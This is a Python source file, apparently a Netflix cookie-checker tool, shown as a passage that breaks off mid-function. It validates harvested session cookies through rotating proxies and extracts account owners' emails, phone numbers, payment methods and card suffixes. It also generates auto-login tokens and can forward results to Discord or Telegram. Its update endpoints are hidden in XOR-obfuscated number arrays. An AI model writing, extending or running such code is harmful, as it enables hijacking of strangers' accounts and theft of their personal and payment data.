import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import threading
import unicodedata
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import requests

try:
    import yaml
except ImportError:
    yaml = None

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False,
        "email": False,
        "max_streams": True,
        "plan": True,
        "country": True,
        "member_since": False,
        "next_billing": True,
        "extra_members": True,
        "payment_method": True,
        "card": False,
        "phone": False,
        "quality": True,
        "hold_status": False,
        "email_verified": False,
        "membership_status": False,
        "profiles": True,
        "user_guid": False,
    },
    "nftoken": False,
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "full",
            "plans": "all",
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "full",
            "plans": "all",
        },
    },
    "display": {
        "mode": "simple",
    },
    "retries": {
        "error_proxy_attempts": 3,
        "nftoken_attempts": 1,
    },
}

DEFAULT_YAML_CONFIG = """# Checker By: https://github.com/harshitkamboj
# Website: https://harshitkamboj.in
# Discord: illuminatis69

# Netflix Checker configuration
# true/false fields let users turn output lines ON/OFF in generated txt.
# Main fields stay ON by default. Advanced fields are listed too, but OFF by default.
txt_fields:
  name: false # account holder name
  email: false # account email
  plan: true # plan name
  country: true # country code
  member_since: false # account membership date
  quality: true # playback quality
  max_streams: true # max concurrent screens
  next_billing: true # next billing date
  payment_method: true # payment method type
  card: false # masked card / bank suffix
  phone: false # phone number
  hold_status: false # account hold status
  extra_members: true # whether extra members are enabled
  email_verified: false # email verification status
  membership_status: false # membership state
  profiles: true # profile names
  user_guid: false # user GUID extracted from account data

nftoken: false # allowed: true or false

notifications:
  webhook:
    enabled: false # true to send output to Discord webhook
    url: "" # put full webhook URL here
    mode: "full" # allowed: "full", "cookie", "nftoken"
    plans: "all" # use "all" or multiple like ["premium", "standard_with_ads", "standard", "basic", "mobile", "free"]

  telegram:
    enabled: false # true to send output to Telegram
    bot_token: "" # token from @BotFather
    chat_id: "" # your chat/channel id (example: "-1001234567890")
    mode: "full" # allowed: "full", "cookie", "nftoken"
    plans: "all" # use "all" or multiple like ["premium", "standard_with_ads", "standard", "basic", "mobile", "free"]

display:
  mode: "simple" # allowed: "log" or "simple"

retries:
  error_proxy_attempts: 3 # retry attempts on network/proxy errors (rotates proxy each try)
  nftoken_attempts: 1 # retry attempts for NFToken creation
"""

BANNER = r"""
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝

by https://github.com/harshitkamboj | website: harshitkamboj.in | discord: https://discord.gg/DYJFE9nu5X
                        (Star The Repo 🌟 and Share for more Checkers)
"""

APP_VERSION = "3.0.0"

cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"
DISCORD_WEBHOOK_USERNAME = "Netflix Checker github.com/harshitkamboj"
DISCORD_WEBHOOK_AVATAR_URL = "https://i.ibb.co/XZLnRkFs/netflix-logo-png-2616.png"

lock = threading.Lock()
guid_lock = threading.Lock()
processed_emails = set()

NFTOKEN_API_URL = "https://android13.prod.ftl.netflix.com/graphql"
NFTOKEN_HEADERS = {
    "User-Agent": (
        "com.netflix.mediaclient/63884 "
        "(Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)"
    ),
    "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
    "Content-Type": "application/json",
    "Origin": "https://www.netflix.com",
    "Referer": "https://www.netflix.com/",
}
NFTOKEN_PAYLOAD = {
    "operationName": "CreateAutoLoginToken",
    "variables": {
        "scope": "WEBVIEW_MOBILE_STREAMING",
    },
    "extensions": {
        "persistedQuery": {
            "version": 102,
            "id": "76e97129-f4b5-41a0-a73c-12e674896849",
        }
    },
}


def _decode_hidden_text(values):
    return "".join(chr(value ^ _pull_bias()) for value in values)


def _stitch_hidden(slot):
    merged = []
    for provider in (_noise_floor, _window_cache, _frame_index):
        for block in provider(slot):
            merged.extend(block)
    return _decode_hidden_text(merged)


def parse_version_parts(value):
    cleaned = str(value or "").strip().lower().lstrip("v")
    parts = []
    for part in cleaned.split("."):
        match = re.match(r"(\d+)", part)
        parts.append(int(match.group(1)) if match else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def is_newer_version(current_version, latest_version):
    current_parts = parse_version_parts(current_version)
    latest_parts = parse_version_parts(latest_version)
    max_len = max(len(current_parts), len(latest_parts))
    current_parts += (0,) * (max_len - len(current_parts))
    latest_parts += (0,) * (max_len - len(latest_parts))
    return latest_parts > current_parts


def _resolve_update_endpoints():
    # ref: gh[.]com/harshitkamboj
    repo_url = _stitch_hidden(29)
    repo_root = _stitch_hidden(53)
    api_prefix = _stitch_hidden(59)
    api_suffix = _stitch_hidden(61)
    accept_value = _stitch_hidden(67)
    agent_prefix = _stitch_hidden(71)
    repo_path = repo_url.replace(repo_root, "", 1).strip("/")
    return {
        "repo_url": repo_url,
        "api_url": f"{api_prefix}{repo_path}{api_suffix}",
        "discord_url": _stitch_hidden(47),
        "accept_value": accept_value,
        "agent_value": f"{agent_prefix}{APP_VERSION}",
    }


def _render_update_notice(latest_version, github_url, discord_url):
    divider = "=" * 98
    print("")
    print(divider)
    print(f"{_stitch_hidden(79)}{APP_VERSION}{_stitch_hidden(83)}{latest_version}")
    print(f"{_stitch_hidden(89)}{github_url}")
    print(f"{_stitch_hidden(97)}{discord_url}")
    print(divider)
    print("")


def check_for_updates():
    update_meta = _resolve_update_endpoints()

    try:
        response = requests.get(
            update_meta["api_url"],
            headers={
                "Accept": update_meta["accept_value"],
                "User-Agent": update_meta["agent_value"],
            },
            timeout=5,
        )
        if response.status_code != 200:
            return

        payload = response.json()
        if not isinstance(payload, dict):
            return

        latest_version = str(payload.get("tag_name") or payload.get("name") or "").strip()
        if not latest_version or not is_newer_version(APP_VERSION, latest_version):
            return

        github_url = payload.get(_stitch_hidden(73)) or update_meta["repo_url"]
        _render_update_notice(latest_version, github_url, update_meta["discord_url"])
    except Exception:
        return


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def set_console_title(title):
    if os.name == "nt":
        os.system(f"title NetflixChecker - {title}")
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def color_text(text, code, enabled=True):
    if not enabled:
        return text
    return f"{code}{text}\033[0m"


def create_base_folders():
    # note: site=harshitkamboj[.]in
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)

    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")
            f.write("# One proxy per line\n")
            f.write("# Supported examples:\n")
            f.write("# ip:port\n")
            f.write("# user:pass@ip:port\n")
            f.write("# ip:port@user:pass\n")
            f.write("# http://ip:port\n")
            f.write("# https://user:pass@ip:port\n")
            f.write("# socks4://user:pass@ip:port\n")
            f.write("# socks5://user:pass@ip:port\n")
            f.write("# ip:port:user:pass\n")
            f.write("# user:pass:ip:port\n")
            f.write("# ip:port user:pass\n")
            f.write("# ip:port|user:pass\n")


def get_run_folder():
    now = datetime.now()
    return f"run_{now.strftime('%Y-%m-%d_%H-%M-%S')}"


def cleanup_stale_temp_files():
    managed_roots = [output_folder, failed_folder, broken_folder]
    for root in managed_roots:
        if not os.path.exists(root):
            continue
        for current_root, _, files in os.walk(root):
            for filename in files:
                if filename.lower().endswith(".tmp"):
                    try:
                        os.remove(os.path.join(current_root, filename))
                    except Exception:
                        pass


def sanitize_reason_for_filename(reason):
    cleaned = decode_netflix_value(reason) or "unknown_reason"
    cleaned = cleaned.strip().lower()
    replacements = {
        "http 403 forbidden": "http_403_forbidden",
        "http 429 rate limited": "http_429_rate_limited",
        "http 500 server error": "http_500_server_error",
        "http 502 bad gateway": "http_502_bad_gateway",
        "http 503 service unavailable": "http_503_service_unavailable",
        "http 504 gateway timeout": "http_504_gateway_timeout",
        "request timeout": "timeout",
        "timeout": "timeout",
        "proxy error": "proxy_error",
        "missing required cookies": "missing_required_cookies",
        "incomplete account page": "incomplete_account_page",
        "nftoken api error": "nftoken_api_error",
    }
    for source, target in replacements.items():
        if cleaned == source:
            cleaned = target
            break
    cleaned = re.sub(r"[^a-z0-9]+", "_", cleaned).strip("_")
    return cleaned or "unknown_reason"


def build_reason_filename(original_name, reason):
    base_name, extension = os.path.splitext(original_name)
    safe_reason = sanitize_reason_for_filename(reason)
    trimmed_base = re.sub(r'[<>:"/\\|?*]+', "_", base_name).strip(" .") or "cookie"
    candidate = f"{safe_reason}_{trimmed_base}{extension or '.txt'}"
    return candidate


def move_cookie_with_reason(cookie_path, target_folder, cookie_file, reason):
    if not os.path.exists(cookie_path):
        return
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base_name, extension = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base_name}_{suffix}{extension}")
    shutil.move(cookie_path, target_path)


def is_plan_allowed_for_notifications(channel_cfg, plan_key):
    plans_value = (channel_cfg or {}).get("plans", "all")
    if plans_value is None:
        return True
    if isinstance(plans_value, str):
        normalized = plans_value.strip().lower()
        if normalized in {"", "all", "*"}:
            return True
        allowed = {item.strip().lower() for item in normalized.split(",") if item.strip()}
        return (plan_key or "").lower() in allowed
    if isinstance(plans_value, (list, tuple, set)):
        allowed = {str(item).strip().lower() for item in plans_value if str(item).strip()}
        if not allowed:
            return True
        return (plan_key or "").lower() in allowed
    return True


def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium",
        "standard_with_ads": "Standard With Ads",
        "standard": "Standard",
        "basic": "Basic",
        "mobile": "Mobile",
        "free": "Free",
        "duplicate": "Duplicate",
        "unknown": "Unknown",
    }
    return canonical_labels.get(plan_key, "Unknown")


def create_output_folder_when_needed(base_folder, plan_label, run_folder):
    safe_plan = decode_netflix_value(plan_label) or "Unknown"
    safe_plan = re.sub(r'[<>:"/\\|?*]+', "_", safe_plan).strip(" .")
    safe_plan = safe_plan or "Unknown"
    output_path = os.path.join(base_folder, run_folder, safe_plan)
    os.makedirs(output_path, exist_ok=True)
    return output_path


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")

    last_error = None
    for _ in range(2):
        try:
            with open(path, "wb") as out_f:
                out_f.write(data)
                out_f.flush()
                try:
                    os.fsync(out_f.fileno())
                except OSError:
                    pass
            if data and os.path.getsize(path) == 0:
                raise IOError("File write produced a zero-byte output")
            return
        except Exception as exc:
            last_error = exc
            try:
                if os.path.exists(path) and os.path.getsize(path) == 0:
                    os.remove(path)
            except Exception:
                pass
    if last_error is not None:
        raise last_error


def _pull_bias():
    anchor = (11, 7, 5)
    return sum(anchor)


_NOISE_FLOOR_MAP = {
    53: ((127, 99, 99, 103, 100, 45, 56, 56, 112, 126),),
    73: ((127, 99, 122),),
    29: (
        (127, 99, 99, 103, 100, 45, 56, 56, 112, 126, 99, 127, 98, 117, 57, 116, 120, 122),
        (56, 127, 118, 101, 100, 127, 126, 99, 124, 118, 122, 117, 120, 125),
    ),
    59: ((127, 99, 99, 103, 100, 45, 56, 56, 118, 103, 126, 57),),
    79: ((66, 103, 115, 118, 99, 114),),
    89: ((83, 120, 96, 121, 123, 120, 118, 115),),
    47: ((127, 99, 99, 103, 100, 45, 56, 56, 115, 126),),
    97: ((83, 120, 96, 121, 123, 120, 118, 115),),
}


def _noise_floor(slot):
    return _NOISE_FLOOR_MAP.get(slot, ())


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def load_config():
    # mirror ref -> github.com / harshitkamboj
    config_yaml_path = "config.yml"

    if os.path.exists(config_yaml_path):
        if yaml is None:
            print("Warning: PyYAML not installed. Run: pip install -r requirements.txt")
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            print("Warning: Invalid config.yml. Recreating config.yml with defaults.")
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path


def print_config_summary(config, config_source):
    # web tag: https[:]//harshitkamboj.in
    txt_fields = config.get("txt_fields", {})
    nftoken_mode = get_nftoken_mode(config)
    webhook_cfg = config.get("notifications", {}).get("webhook", {})
    telegram_cfg = config.get("notifications", {}).get("telegram", {})
    display_cfg = config.get("display", {})
    retries_cfg = config.get("retries", {})
    retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    enabled_txt = [k for k, v in txt_fields.items() if bool(v)]
    try:
        retry_attempts = max(1, int(retry_attempts))
    except Exception:
        retry_attempts = 3

    print("Active Config")
    print(f"- Config file: {config_source}")
    print(f"- TXT fields enabled: {', '.join(enabled_txt) if enabled_txt else 'none'}")
    print(f"- NFToken links: {nftoken_mode}")
    print(f"- Webhook: {'ON' if webhook_cfg.get('enabled') else 'OFF'} (mode: {webhook_cfg.get('mode', 'full')})")
    print(f"- Telegram: {'ON' if telegram_cfg.get('enabled') else 'OFF'} (mode: {telegram_cfg.get('mode', 'full')})")
    print(f"- Display: mode={display_cfg.get('mode', 'log')}")
    print(f"- Retry attempts on proxy/network error: {retry_attempts}")
    print("")


def describe_http_error(status_code):
    descriptions = {
        403: "HTTP 403 Forbidden",
        429: "HTTP 429 Rate Limited",
        500: "HTTP 500 Server Error",
        502: "HTTP 502 Bad Gateway",
        503: "HTTP 503 Service Unavailable",
        504: "HTTP 504 Gateway Timeout",
    }
    return descriptions.get(status_code, f"HTTP {status_code}")


def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cookies_total, colored=True):
    title_color = "\033[96m"
    section_color = "\033[95m"
    label_color = "\033[94m"
    value_color = "\033[93m"
    dim_color = "\033[90m"
    progress_color = "\033[92m"
    good_color = "\033[92m"
    free_color = "\033[95m"
    bad_color = "\033[91m"

    clear_screen()
    processed = cookies_total - cookies_left
    valid = counts["hits"] + counts["free"]

    print(BANNER)
    print(color_text("Netflix Checker - Simple Mode", title_color, colored))
    print(
        f"{color_text('Progress:', title_color, colored)} "
        f"{color_text(str(processed), progress_color, colored)}/{color_text(str(cookies_total), progress_color, colored)} "
        f"| {color_text('Left:', title_color, colored)} {color_text(str(cookies_left), value_color, colored)}"
    )
    print("")
    print(color_text("Plan Counts", section_color, colored))
    default_plan_order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free", "unknown"]
    extra_plan_keys = sorted(key for key in plan_counts.keys() if key not in default_plan_order)
    plan_keys = default_plan_order + extra_plan_keys
    for plan_key in plan_keys:
        value = plan_counts.get(plan_key, 0)
        plan_label = decode_netflix_value(plan_labels.get(plan_key)) or format_plan_label(plan_key)
        print(f"{color_text(plan_label + ':', label_color, colored)} {color_text(str(value), value_color, colored)}")

    print("")
    print(color_text("Status", section_color, colored))
    print(f"{color_text('Valid:', label_color, colored)} {color_text(str(valid), good_color, colored)}")
    print(f"{color_text('Good :', label_color, colored)} {color_text(str(counts['hits']), good_color, colored)}")
    print(f"{color_text('Free :', label_color, colored)} {color_text(str(counts['free']), free_color, colored)}")
    print(f"{color_text('Bad  :', label_color, colored)} {color_text(str(counts['bad']), bad_color, colored)}")
    print(f"{color_text('Dup  :', label_color, colored)} {color_text(str(counts['duplicate']), value_color, colored)}")
    print(f"{color_text('Err  :', label_color, colored)} {color_text(str(counts['errors']), bad_color, colored)}")


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()

    url_like = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
        flags=re.IGNORECASE,
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(
            data["scheme"].lower(),
            data["host"],
            data["port"],
            data.get("user"),
            data.get("password"),
        )

    userpass_hostport = re.match(
        r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
    )
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport_userpass = re.match(
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$",
        line,
    )
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])

    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c, d, a, b)

    split_patterns = [
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$",
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    return None


_WINDOW_CACHE_MAP = {
    53: ((99, 127, 98, 117, 57, 116, 120, 122, 56),),
    73: ((123, 72, 98),),
    29: ((56, 89, 114, 99, 113, 123, 126, 111, 58, 84, 120, 120, 124, 126, 114),),
    59: ((112, 126, 99, 127, 98, 117, 57, 116, 120, 122, 56, 101, 114, 103),),
    79: ((55, 118, 97, 118, 126, 123, 118, 117),),
    83: ((55, 58),),
    89: ((55, 113, 101, 120, 122, 55, 80, 126),),
    47: ((100, 116, 120, 101, 115, 57, 112, 112, 56, 83),),
    97: ((55, 113, 101, 120, 122, 55, 83, 126),),
}


def _window_cache(slot):
    return _WINDOW_CACHE_MAP.get(slot, ())


def load_proxies():
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


REQUIRED_NETFLIX_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid")
OPTIONAL_NETFLIX_COOKIES = ("OptanonConsent",)
ALL_NETFLIX_COOKIE_NAMES = set(REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)


def is_netflix_domain(domain):
    normalized = str(domain or "").strip().lower()
    return "netflix." in normalized


def is_netflix_cookie_entry(domain, name):
    normalized_name = str(name or "").strip()
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""

    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
            netscape_lines.append(line)
    return "\n".join(netscape_lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if not is_netscape_cookie_line(line):
            continue
        parts = line.strip().split("\t")
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = parts[5]
        if is_netflix_cookie_entry(domain, name):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            name = parts[5]
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


def extract_netflix_cookie_text_from_raw(raw_text):
    cookie_map = {}
    for cookie_name in ALL_NETFLIX_COOKIE_NAMES:
        match = re.search(rf"{re.escape(cookie_name)}=([^;\s]+)", raw_text)
        if match:
            cookie_map[cookie_name] = match.group(1)
    if not cookie_map:
        return ""

    lines = []
    for cookie_name in REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES:
        if cookie_map.get(cookie_name):
            lines.append(
                f".netflix.com\tTRUE\t/\t{'TRUE' if cookie_name == 'SecureNetflixId' else 'FALSE'}\t0\t{cookie_name}\t{cookie_map[cookie_name]}"
            )
    return "\n".join(lines)


def extract_netflix_cookie_text(content):
    try:
        cookies_json = json.loads(content)
        json_netscape = normalize_netscape_cookie_text(convert_json_to_netscape(cookies_json))
        if json_netscape:
            return json_netscape
    except Exception:
        pass

    netscape_content = normalize_netscape_cookie_text(content)
    if netscape_content:
        return netscape_content

    return extract_netflix_cookie_text_from_raw(content)


def _decode_unicode_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def _decode_hex_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {
        "\\x20": " ",
        "\\u00A0": " ",
        "\\u00a0": " ",
        "&nbsp;": " ",
        "u00A0": " ",
    }
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    lowered = value.lower()
    if lowered == "true":
        return "Yes"
    if lowered == "false":
        return "No"
    return value


def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    if not names:
        return None
    return ", ".join(names)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged


def has_complete_account_info(info):
    if not info:
        return False
    required_fields = (
        "countryOfSignup",
        "membershipStatus",
        "localizedPlanName",
        "maxStreams",
        "videoQuality",
    )
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)


def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}

    if not isinstance(payload, dict):
        return {}

    data = payload.get("data")
    if not isinstance(data, dict):
        return {}

    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded

        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
